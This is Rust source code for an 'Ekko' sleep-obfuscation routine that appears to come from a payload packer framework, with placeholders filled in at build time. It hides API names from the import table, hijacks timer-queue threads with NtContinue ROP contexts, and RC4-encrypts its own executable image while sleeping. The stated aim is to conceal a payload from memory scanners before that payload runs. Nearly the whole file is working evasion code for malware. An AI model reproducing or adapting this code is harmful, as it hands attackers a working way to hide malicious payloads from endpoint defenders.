// --- Sleep obfuscation, ekko variant (technique fragment) ---

use std::ffi::c_void;
use std::mem::{size_of, transmute, transmute_copy};

use windows::core::PCSTR;
use windows::Win32::Foundation::{GetLastError, HMODULE};
use windows::Win32::System::Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows::Win32::System::Threading::{CreateEventW, WT_EXECUTEINTIMERTHREAD};

/// The configured sleep length in milliseconds (baked in by the packer).
const SLEEP_MS: u64 = $SLEEP_MS$;

/// Chunk size for the `SystemFunction032` (RC4) calls. Its data parameter is a
/// `struct ustring` whose `Length` is a `DWORD` (u32), so one call can cover
/// the whole image; splitting into ≤ 64 KB chunks is kept as a per-call safety
/// margin and never truncates.
const CHUNK: usize = 0xFFF0;

/// Stagger between consecutive timer steps, in milliseconds. Each step must
/// fully return into the timer dispatch before the next one fires.
const STEP: u32 = 50;

/// Due time of the first ROP step, in milliseconds (right after the capture).
const FIRST_STEP: u32 = 100;

/// How often to poll for the capture timer to have fired, in milliseconds.
const CAPTURE_POLL_MS: u32 = 10;

/// How many polls before giving up on the capture (10 ms * 100 = 1 s).
const CAPTURE_TRIES: u32 = 100;

/// `ERROR_SEM_TIMEOUT`-style wait result code for a timed-out wait.
const WAIT_TIMEOUT: u32 = 0x102;

/// Pseudo-handle for the current process; waiting on it times out, which is
/// the whole point of the delay step.
const CURRENT_PROCESS: isize = -1;

/// Timer-thread callback ABI (`WAITORTIMERCALLBACK`): parameter + fired flag.
type TimerCallback = unsafe extern "system" fn(*mut c_void, u8);

/// `HANDLE CreateTimerQueue(void)`.
type FnCreateTimerQueue = unsafe extern "system" fn() -> isize;

/// `BOOL CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID,
/// DWORD, DWORD, ULONG)`.
type FnCreateTimerQueueTimer = unsafe extern "system" fn(
    *mut isize,
    isize,
    TimerCallback,
    *mut c_void,
    u32,
    u32,
    u32,
) -> i32;

/// `BOOL DeleteTimerQueueEx(HANDLE, HANDLE)`.
type FnDeleteTimerQueueEx = unsafe extern "system" fn(isize, isize) -> i32;

/// `DWORD WaitForSingleObject(HANDLE, DWORD)`.
type FnWaitForSingleObject = unsafe extern "system" fn(isize, u32) -> u32;

/// `BOOL SetEvent(HANDLE)`.
type FnSetEvent = unsafe extern "system" fn(isize) -> i32;

/// `BOOL VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD)`.
type FnVirtualProtect = unsafe extern "system" fn(*const c_void, usize, u32, *mut u32) -> i32;

/// `NTSTATUS NtContinue(PCONTEXT, BOOLEAN)`.
type FnNtContinue = unsafe extern "system" fn(*const AlignedContext, u8) -> i32;

/// `VOID RtlCaptureContext(PCONTEXT)`.
type FnRtlCaptureContext = unsafe extern "system" fn(*mut AlignedContext);

/// `NTSTATUS SystemFunction032(struct USTRING*, struct USTRING*)`.
type FnSystemFunction032 = unsafe extern "system" fn(*const UString, *const UString) -> i32;

/// Errors produced while running an obfuscated sleep.
///
/// The variants that report a Win32 error code carry `GetLastError()` (or the
/// wait status) as their payload. `CryptFunctionFailed` is reserved: in this
/// variant the RC4 call runs on a hijacked timer thread whose NTSTATUS is not
/// observable from the calling thread, so the variant is not constructed here
/// (the direct-call variants will use it).
#[derive(Debug, thiserror::Error)]
pub enum SleepObfuscationError {
    #[error("could not capture a timer-thread context (code 0x{0:08x})")]
    CaptureContextFailed(u32),
    #[error("could not create the timer queue (code 0x{0:08x})")]
    CreateTimerQueueFailed(u32),
    #[error("could not queue a timer (code 0x{0:08x})")]
    CreateTimerQueueTimerFailed(u32),
    #[error("could not walk the image memory (code 0x{0:08x})")]
    VirtualQueryFailed(u32),
    #[error("could not change the image memory protection (code 0x{0:08x})")]
    VirtualProtectFailed(u32),
    #[error("could not resolve the RC4 system function")]
    CryptFunctionNotFound,
    /// The RC4 call itself runs on a hijacked timer thread whose NTSTATUS is
    /// not observable here, so this variant only reports the key-derivation
    /// failure; the direct-call variants will also surface the RC4 status.
    #[error("the RC4 system function failed (0x{0:08x})")]
    CryptFunctionFailed(u32),
    #[error("no committed region of the image to encrypt")]
    NoTargetRegions,
}

/// `NtContinue` reads the whole x64 `CONTEXT`; the `windows` binding exposes it
/// with the correct field offsets but only 8-byte alignment, so force 16 (same
/// wrapper the `Get/SetThreadContext` fragments use).
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// The `struct ustring` layout `SystemFunction032` (RC4) reads: `Length` and
/// `MaximumLength` are `DWORD`s (u32), not the `USHORT`s of a `UNICODE_STRING`.
/// Using a `UNICODE_STRING`-shaped pair here silently truncates the image and
/// smears the two `u16` halves of each length field into one garbage `u32`.
#[repr(C)]
struct UString {
    length: u32,
    maximum_length: u32,
    buffer: *mut u8,
}

impl UString {
    /// Wraps an existing byte region without copying it.
    fn from_raw(bytes: *mut u8, len: usize) -> Self {
        Self {
            length: len as u32,
            maximum_length: len as u32,
            buffer: bytes,
        }
    }

    /// Wraps a heap-owned buffer (the RC4 key).
    fn from_bytes(bytes: &mut [u8]) -> Self {
        Self {
            length: bytes.len() as u32,
            maximum_length: bytes.len() as u32,
            buffer: bytes.as_mut_ptr(),
        }
    }
}

/// Resolves `name` in `module` and reinterprets it with the requested ABI.
///
/// `name` is a runtime-rebuilt string (`StringsConfig`), so it never appears
/// in the binary's cleartext. The transmute only fixes the signature; both
/// sides are function pointers of the same size.
fn resolve_as<T>(
    module: HMODULE,
    name: &str,
    on_missing: SleepObfuscationError,
) -> Result<T, SleepObfuscationError> {
    let cname = match std::ffi::CString::new(name) {
        Ok(c) => c,
        Err(_) => return Err(on_missing),
    };
    let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
    match address {
        Some(function) => {
            // transmute_copy: the generic target has no size-checkable
            // transmute; every call site uses an 8-byte fn pointer type.
            let raw = function as usize;
            Ok(unsafe { transmute_copy(&raw) })
        }
        None => Err(on_missing),
    }
}

/// Resolves an export to a raw address, or `None` (best-effort lookups).
fn resolve_address(module: HMODULE, name: &str) -> Option<usize> {
    let cname = std::ffi::CString::new(name).ok()?;
    let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
    address.map(|function| function as usize)
}

/// Queues one timer whose callback is the given continuation. The callback
/// parameter is the ROP context itself, so when the timer fires the dispatch
/// hands the context straight to `NtContinue`/`RtlCaptureContext`.
fn queue_timer(
    queue: isize,
    create_timer_queue_timer: FnCreateTimerQueueTimer,
    callback: TimerCallback,
    context: &AlignedContext,
    due_ms: u32,
) -> Result<(), SleepObfuscationError> {
    let mut timer = 0isize;
    let ok = unsafe {
        create_timer_queue_timer(
            &mut timer,
            queue,
            callback,
            context as *const AlignedContext as *mut c_void,
            due_ms,
            0,
            WT_EXECUTEINTIMERTHREAD.0,
        )
    };
    if ok == 0 {
        return Err(SleepObfuscationError::CreateTimerQueueTimerFailed(unsafe {
            GetLastError().0
        }));
    }
    Ok(())
}

/// Builds a continuation context: the captured timer-thread context with a new
/// instruction pointer, four argument registers, and a stack pointer lowered by
/// one slot.
///
/// That one slot is the core Ekko trick: `RtlCaptureContext` stores `Rsp` just
/// past the return address its own caller (the timer dispatch) left on the
/// stack, so a target function entered at `Rsp - 8` returns straight into the
/// dispatch and the hijacked timer thread unwinds cleanly instead of crashing.
fn rop_context(
    captured: &CONTEXT,
    rip: u64,
    rcx: u64,
    rdx: u64,
    r8: u64,
    r9: u64,
) -> CONTEXT {
    let mut context = *captured;
    context.Rip = rip;
    context.Rcx = rcx;
    context.Rdx = rdx;
    context.R8 = r8;
    context.R9 = r9;
    context.Rsp = captured.Rsp.wrapping_sub(8);
    context
}

/// Runs one obfuscated sleep of [`SLEEP_MS`] milliseconds.
///
/// Sequence: capture a timer-thread context, then queue a chain of
/// `NtContinue` timers that flip the image read-write, RC4-encrypt it
/// (`SystemFunction032`), sleep, decrypt it, restore the original protections
/// and signal completion. Nothing executes from the image while it is
/// encrypted or non-executable: the main thread waits on an event and every
/// other thread runs in system DLLs.
///
/// This is the demo form (timing option C): it performs one encrypted sleep
/// and returns, then the Execution technique runs the payload normally.
pub fn sleep_obfuscation() -> Result<(), SleepObfuscationError> {
    // 1. Resolve the libraries and every dynamic entry point. Names are
    //    runtime-rebuilt strings, so none of them reaches the import table.
    let kernel32_name = std::ffi::CString::new($KERNEL32_DLL_DEF$)
        .map_err(|_| SleepObfuscationError::CreateTimerQueueFailed(0))?;
    let kernel32 = unsafe { GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)) }
        .map_err(|_| SleepObfuscationError::CreateTimerQueueFailed(0))?;

    let ntdll_name = std::ffi::CString::new($NTDLL_DLL_DEF$)
        .map_err(|_| SleepObfuscationError::CaptureContextFailed(0))?;
    let ntdll = unsafe { GetModuleHandleA(PCSTR(ntdll_name.as_ptr() as *const u8)) }
        .map_err(|_| SleepObfuscationError::CaptureContextFailed(0))?;

    let advapi32_name = std::ffi::CString::new($ADVAPI32_DLL_DEF$)
        .map_err(|_| SleepObfuscationError::CryptFunctionNotFound)?;
    let advapi32 = unsafe { LoadLibraryA(PCSTR(advapi32_name.as_ptr() as *const u8)) }
        .map_err(|_| SleepObfuscationError::CryptFunctionNotFound)?;

    // Resolution failures reuse the closest error variant with code 0; these
    // paths are unreachable in practice (kernel32/ntdll always export them).
    let create_timer_queue: FnCreateTimerQueue = resolve_as(
        kernel32,
        &$CREATE_TIMER_QUEUE_DEF$,
        SleepObfuscationError::CreateTimerQueueFailed(0),
    )?;
    let create_timer_queue_timer: FnCreateTimerQueueTimer = resolve_as(
        kernel32,
        &$CREATE_TIMER_QUEUE_TIMER_DEF$,
        SleepObfuscationError::CreateTimerQueueTimerFailed(0),
    )?;
    let delete_timer_queue_ex: Option<FnDeleteTimerQueueEx> =
        resolve_address(kernel32, &$DELETE_TIMER_QUEUE_EX_DEF$)
            .map(|address| unsafe { transmute::<usize, FnDeleteTimerQueueEx>(address) });
    let wait_for_single_object: FnWaitForSingleObject = resolve_as(
        kernel32,
        &$WAIT_FOR_SINGLE_OBJECT_DEF$,
        SleepObfuscationError::CaptureContextFailed(0),
    )?;
    let set_event: FnSetEvent = resolve_as(
        kernel32,
        &$SET_EVENT_DEF$,
        SleepObfuscationError::CreateTimerQueueTimerFailed(0),
    )?;
    let virtual_protect: FnVirtualProtect = resolve_as(
        kernel32,
        &$VIRTUAL_PROTECT_DEF$,
        SleepObfuscationError::VirtualProtectFailed(0),
    )?;
    let rtl_capture_context: FnRtlCaptureContext = resolve_as(
        ntdll,
        &$RTL_CAPTURE_CONTEXT_DEF$,
        SleepObfuscationError::CaptureContextFailed(0),
    )?;
    let nt_continue: FnNtContinue = resolve_as(
        ntdll,
        &$NT_CONTINUE_DEF$,
        SleepObfuscationError::CaptureContextFailed(0),
    )?;
    let system_function_032: FnSystemFunction032 = resolve_as(
        advapi32,
        &$SYSTEM_FUNCTION_032_DEF$,
        SleepObfuscationError::CryptFunctionNotFound,
    )?;

    // 2. Locate the image region to encrypt: the whole stub image
    //    (base + SizeOfImage), as the original Ekko does. The payload lives
    //    inside this image, so covering it also covers the payload.
    let image_base = unsafe { GetModuleHandleA(PCSTR::null()) }
        .map_err(|_| SleepObfuscationError::NoTargetRegions)?
        .0 as usize;
    let image_size = {
        let dos = image_base as *const IMAGE_DOS_HEADER;
        let nt = unsafe { (image_base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64 };
        unsafe { (*nt).OptionalHeader.SizeOfImage as usize }
    };
    if image_size == 0 {
        return Err(SleepObfuscationError::NoTargetRegions);
    }

    // 3. Walk the image with VirtualQuery and keep every committed run
    //    (start, length, original protection). The runs drive both the RC4
    //    chunking and the per-run protection restore.
    let runs = walk_image_runs(image_base, image_size)?;

    // The image is flipped read-write by the first ROP step, *not* here:
    // PAGE_READWRITE is non-executable under DEP, so the flip must happen on a
    // timer thread (running kernel32 code) while every other thread — this one
    // included — is parked in a wait or in system DLLs.
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);

    let h_event = unsafe { CreateEventW(None, false, false, None) }
        .map_err(|_| SleepObfuscationError::CreateTimerQueueFailed(unsafe { GetLastError().0 }))?;
    let h_queue = unsafe { create_timer_queue() };
    if h_queue == 0 {
        return Err(SleepObfuscationError::CreateTimerQueueFailed(unsafe {
            GetLastError().0
        }));
    }

    // 4. Capture a timer-thread context for the continuation chain.

    let captured = AlignedContext(CONTEXT::default());
    let capture_callback: TimerCallback = unsafe { transmute(rtl_capture_context) };
    queue_timer(
        h_queue,
        create_timer_queue_timer,
        capture_callback,
        &captured,
        0,
    )?;

    let capture_ok = 'poll: {
        // `captured` is written by the timer thread through RtlCaptureContext;
        // a plain load can be hoisted out of the loop by the optimizer (the
        // write is invisible to it), so read the flag as volatile.
        for _ in 0..CAPTURE_TRIES {
            let rip = unsafe { std::ptr::read_volatile(&captured.0.Rip) };
            if rip != 0 {
                break 'poll true;
            }
            unsafe {
                wait_for_single_object(h_event.0 as isize, CAPTURE_POLL_MS);
            }
        }
        false
    };
    if !capture_ok {
        return Err(SleepObfuscationError::CaptureContextFailed(WAIT_TIMEOUT));
    }

    // 5. Build the continuation contexts. The RC4 key is the first 16 bytes
    //    of the per-build XChaCha key, so the sleeping image is keyed per
    //    build (the original Ekko hardcodes 0x55).
    let mut key_bytes = hex::decode(&crate::KEY_HEX[..32])
        .map_err(|_| SleepObfuscationError::CryptFunctionFailed(0))?;
    let key = UString::from_bytes(&mut key_bytes);

    let mut chunks: Vec<UString> = Vec::new();
    for &(start, len, _) in &runs {
        let mut offset = 0usize;
        while offset < len {
            let n = (len - offset).min(CHUNK);
            chunks.push(UString::from_raw((start + offset) as *mut u8, n));
            offset += n;
        }
    }

    let encrypt_function = system_function_032 as usize as u64;
    let encrypt_contexts: Vec<AlignedContext> = chunks
        .iter()
        .map(|chunk| {
            AlignedContext(rop_context(
                &captured.0,
                encrypt_function,
                chunk as *const UString as usize as u64,
                &key as *const UString as usize as u64,
                0,
                0,
            ))
        })
        .collect();
    let decrypt_contexts: Vec<AlignedContext> = chunks
        .iter()
        .map(|chunk| {
            AlignedContext(rop_context(
                &captured.0,
                encrypt_function,
                chunk as *const UString as usize as u64,
                &key as *const UString as usize as u64,
                0,
                0,
            ))
        })
        .collect();

    let delay_context = AlignedContext(rop_context(
        &captured.0,
        wait_for_single_object as usize as u64,
        CURRENT_PROCESS as usize as u64,
        SLEEP_MS as u32 as u64,
        0,
        0,
    ));

    // First ROP step: flip the whole image read-write so the encryption can
    // write to it. Runs on the timer thread, so no image code executes on NX
    // pages.
    let protect_context = AlignedContext(rop_context(
        &captured.0,
        virtual_protect as usize as u64,
        image_base as u64,
        image_size as u64,
        PAGE_READWRITE.0 as u64,
        &old_protect as *const PAGE_PROTECTION_FLAGS as usize as u64,
    ));

    let restore_function = virtual_protect as usize as u64;
    let restore_contexts: Vec<AlignedContext> = runs
        .iter()
        .map(|&(start, len, protect)| {
            AlignedContext(rop_context(
                &captured.0,
                restore_function,
                start as u64,
                len as u64,
                protect as u64,
                &old_protect as *const PAGE_PROTECTION_FLAGS as usize as u64,
            ))
        })
        .collect();

    let set_event_context = AlignedContext(rop_context(
        &captured.0,
        set_event as usize as u64,
        h_event.0 as usize as u64,
        0,
        0,
        0,
    ));

    // 6. Queue the chain with staggered due times. The decrypt/restore steps
    //    are scheduled *after* the sleep, unlike the original PoC, which let
    //    them fire during it (its best-known flaw).
    let continue_callback: TimerCallback = unsafe { transmute(nt_continue) };
    let mut due: u32 = FIRST_STEP;
    queue_timer(
        h_queue,
        create_timer_queue_timer,
        continue_callback,
        &protect_context,
        due,
    )?;
    due = due.saturating_add(STEP);
    for context in &encrypt_contexts {
        queue_timer(
            h_queue,
            create_timer_queue_timer,
            continue_callback,
            context,
            due,
        )?;
        due = due.saturating_add(STEP);
    }
    let delay_due = due;
    queue_timer(
        h_queue,
        create_timer_queue_timer,
        continue_callback,
        &delay_context,
        due,
    )?;
    due = delay_due
        .saturating_add(SLEEP_MS as u32)
        .saturating_add(STEP);
    for context in &decrypt_contexts {
        queue_timer(
            h_queue,
            create_timer_queue_timer,
            continue_callback,
            context,
            due,
        )?;
        due = due.saturating_add(STEP);
    }
    for context in &restore_contexts {
        queue_timer(
            h_queue,
            create_timer_queue_timer,
            continue_callback,
            context,
            due,
        )?;
        due = due.saturating_add(STEP);
    }
    queue_timer(
        h_queue,
        create_timer_queue_timer,
        continue_callback,
        &set_event_context,
        due,
    )?;

    // 7. Wait for the last step to signal completion, then tear the queue down.
    //    By the time the event is set, every step (including the delay) has
    //    already returned, so the queue deletion cannot block.
    unsafe {
        wait_for_single_object(h_event.0 as isize, u32::MAX);
    }
    if let Some(delete_timer_queue_ex) = delete_timer_queue_ex {
        // The second handle is INVALID_HANDLE_VALUE: wait for every callback
        // to have finished before returning to the pipeline.
        unsafe {
            delete_timer_queue_ex(h_queue, -1);
        }
    }

    Ok(())
}

/// Walks `[base, base + size)` with `VirtualQuery` and returns every committed
/// run as `(start, length, protection)`, clamped to the requested range.
fn walk_image_runs(
    base: usize,
    size: usize,
) -> Result<Vec<(usize, usize, u32)>, SleepObfuscationError> {
    let mut runs = Vec::new();
    let end = base + size;
    let mut cursor = base;
    while cursor < end {
        let mut info = MEMORY_BASIC_INFORMATION::default();
        let written = unsafe {
            VirtualQuery(
                Some(cursor as *const c_void),
                &mut info,
                size_of::<MEMORY_BASIC_INFORMATION>(),
            )
        };
        if written == 0 {
            return Err(SleepObfuscationError::VirtualQueryFailed(unsafe {
                GetLastError().0
            }));
        }
        let region_end = (info.BaseAddress as usize).saturating_add(info.RegionSize);
        if region_end <= cursor {
            return Err(SleepObfuscationError::VirtualQueryFailed(0));
        }
        if info.State == MEM_COMMIT {
            let start = cursor.max(info.BaseAddress as usize);
            let stop = end.min(region_end);
            if stop > start {
                runs.push((start, stop - start, info.Protect.0));
            }
        }
        cursor = region_end;
    }
    if runs.is_empty() {
        return Err(SleepObfuscationError::NoTargetRegions);
    }
    Ok(runs)
}
